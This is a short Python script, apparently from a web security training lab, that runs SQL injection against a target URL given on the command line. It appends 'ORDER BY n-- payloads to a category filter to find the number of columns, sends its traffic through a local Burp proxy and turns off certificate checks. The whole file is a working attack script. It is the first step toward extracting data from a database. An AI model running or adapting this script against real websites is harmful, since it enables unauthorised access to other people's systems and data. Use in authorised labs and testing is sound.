import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# burp suite is between the script and source


proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }


def exploit_sqli(s, url):
    uri = "/filter?category=Accessories"
    for i in range(1,50):
        column = "'ORDER+BY+%s--" %i
        r = s.get(url+uri+column,verify=False,proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
    return False
    

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    col = exploit_sqli(s,url)
    if col:
        print("[+] SQL Injection was successful "+str(col))
    else:
        print("[-] SQL Injection was unsuccessful")